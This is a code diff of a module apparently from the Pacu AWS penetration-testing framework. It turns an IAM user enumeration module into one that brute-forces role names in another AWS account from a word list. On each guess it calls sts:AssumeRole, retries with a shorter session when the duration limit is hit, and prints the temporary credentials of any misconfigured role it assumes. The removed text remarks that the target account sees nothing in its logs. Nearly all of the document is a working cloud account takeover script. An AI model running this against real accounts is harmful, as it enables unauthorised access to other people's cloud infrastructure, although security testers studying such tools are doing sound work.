@@ -1,33 +1,34 @@
 #!/usr/bin/env python3
 import argparse
 import botocore
+import random
+import string
 
 
 module_info = {
-    'name': 'enum_iam_users',
+    'name': 'iam__enum_account_ids',
 
     'author': 'Spencer Gietzen of Rhino Security Labs',
 
     'category': 'RECON_UNAUTH',
 
-    'one_liner': 'Enumerates IAM users in a separate AWS account, given the account ID.',
+    'one_liner': 'Enumerates existing roles in other AWS accounts to try and gain access via misconfigurations.',
 
-    'description': 'This module takes in a valid AWS account ID and tries to enumerate existing IAM users within that account. It does so by trying to update the AssumeRole policy document of the role that you pass into --role-name. For your safety, it updates the policy with an explicit deny against the AWS account/IAM user, so that no security holes are opened in your account during enumeration. NOTE: It is recommended to use personal AWS access keys for this script, as it will spam CloudTrail with "iam:UpdateAssumeRolePolicy" logs. The target account will not see anything in their logs though! The keys used must have the iam:UpdateAssumeRolePolicy permission on the role that you pass into --role-name to be able to identify a valid IAM user.',
+    'description': 'This module takes in an AWS account ID and tries to enumerate role names within that account. If one is discovered and it is misconfigured to allow role-assumption from a wide group, it is possible to assume that role and gain access to that AWS account through this method. NOTE: This module is listed under the recon_enum_no_keys category because it is not recommended to use compromised keys to run this module. This module DOES require a set of AWS keys, but it will spam CloudTrail with "AssumeRole" logs, so it is suggested to use a personal account to run this. The keys you use should have the sts:AssumeRole permission on any resource ("*") to identify/assume misconfigured roles, but you will still be able to enumerate roles that exist without it.',
 
-    'services': ['IAM'],
+    'services': ['STS'],
 
     'prerequisite_modules': [],
 
     'external_dependencies': [],
 
-    'arguments_to_autocomplete': ['--word-list', '--role-name', '--account-id']
+    'arguments_to_autocomplete': ['--account-id', '--word-list']
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
-parser.add_argument('--word-list', required=False, default=None, help='File path to a different word list to use. There is a default word list with 1100+ words. The word list should contain words, one on each line, to use to try and guess IAM role names. Role names ARE case-sensitive.')
-parser.add_argument('--role-name', required=True, help='The name of a valid role in the current users account to try and update the AssumeRole policy document for.')
 parser.add_argument('--account-id', required=True, help='The AWS account ID of the target account (12 numeric characters).')
+parser.add_argument('--word-list', required=False, default=None, help='File path to a different word list to use. There is a default word list with 1100+ words and it is stored in this module\'s folder. The word list should contain words, one on each line, to use to try and guess IAM role names. Role names ARE case-sensitive.')
 
 
 def main(args, pacu_main):
@@ -38,6 +39,14 @@ def main(args, pacu_main):
         print('Error: An AWS account ID is a number of length 12. You supplied: {}\n'.format(args.account_id))
         return None
 
+    data = {
+        'attempts': 0,
+        'enumerated': [],
+        'success': False
+    }
+
+    print('Targeting account ID: {}\n'.format(args.account_id))
+
     if args.word_list is None:
         word_list_path = './modules/{}/default-word-list.txt'.format(module_info['name'])
     else:
@@ -46,50 +55,63 @@ def main(args, pacu_main):
     with open(word_list_path, 'r') as f:
         word_list = f.read().splitlines()
 
-    print('Warning: This script does not check if the keys you supplied have the correct permissions. Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name!\n')
+    print('Starting role enumeration...\n')
 
-    data = {
-        'attempts': 0,
-        'valid_users': []
-    }
-
-    client = pacu_main.get_boto3_client('iam')
-
-    print('Targeting account ID: {}\n'.format(args.account_id))
-    print('Starting user enumeration...\n')
-
+    client = pacu_main.get_boto3_client('sts')
     for word in word_list:
-        user_arn = 'arn:aws:iam::{}:user/{}'.format(args.account_id, word)
+        role_arn = 'arn:aws:iam::{}:role/{}'.format(args.account_id, word)
 
         data['attempts'] += 1
 
         try:
-            client.update_assume_role_policy(
-                RoleName=args.role_name,
-                PolicyDocument='{{"Version":"2012-10-17","Statement":[{{"Effect":"Deny","Principal":{{"AWS":"{}"}},"Action":"sts:AssumeRole"}}]}}'.format(user_arn)
+            response = client.assume_role(
+                RoleArn=role_arn,
+                RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
+                DurationSeconds=43200
             )
-            print('  Found user: {}'.format(user_arn))
-            data['valid_users'].append(user_arn)
-        except botocore.exceptions.ClientError as error:
-            if 'MalformedPolicyDocument' in str(error):
-                # User doesn't exist, continue on
-                pass
-            elif 'NoSuchEntity' in str(error):
-                print('  Error: You did not pass in a valid role name. An existing role is required for this script.')
-                return data
-            else:
-                print('  Unhandled error: {}'.format(str(error)))
-                return data
 
-    if len(data['valid_users']) > 0:
-        print('\nFound {} user(s):\n'.format(len(data['valid_users'])))
-        for user in data['valid_users']:
-            print('    {}'.format(user))
-        print('')
+            print('Successfully assumed role for 12 hours: {}\n'.format(role_arn))
+
+            data['success'] = True
+            data['role_arn'] = role_arn
+            response.pop('ResponseMetadata', None)
+            print(response)
+
+            break
+        except botocore.exceptions.ClientError as error:
+            if 'The requested DurationSeconds exceeds the MaxSessionDuration set for this role.' in str(error):
+                # Found a vulnerable role, but requested more time than the max allowed for it
+                print('** Found vulnerable role: {} **'.format(role_arn))
+                print('  Hit max session time limit, reverting to minimum of 1 hour...\n')
+
+                response = client.assume_role(
+                    RoleArn=role_arn,
+                    RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
+                    DurationSeconds=3600
+                )
+
+                print('Successfully assumed role: {}\n'.format(role_arn))
+
+                data['success'] = True
+                data['role_arn'] = role_arn
+                response.pop('ResponseMetadata', None)
+                print(response)
+
+                break
+            elif 'Not authorized to perform sts:AssumeRole' in str(error):
+                # Role not found
+                pass
+            elif 'is not authorized to perform: sts:AssumeRole on resource' in str(error):
+                # Role found, but not allowed to assume
+                print('Found restricted role: {}\n'.format(role_arn))
+                data['enumerated'].append(role_arn)
 
     print('{} completed.\n'.format(module_info['name']))
     return data
 
 
 def summary(data, pacu_main):
-    return '  {} user(s) found after {} guess(es).'.format(len(data['valid_users']), data['attempts'])
+    if 'success' in data.keys() and data['success'] is True:
+        return 'Successfully found a role we can assume after {} guesses: {}\nEnumerated {} restricted role(s): {}'.format(data['attempts'], data['role_arn'], len(data['enumerated']), data['enumerated'])
+    else:
+        return 'Did not find a role to assume after {} guesses.\nEnumerated {} restricted role(s): {}'.format(data['attempts'], len(data['enumerated']), data['enumerated'])
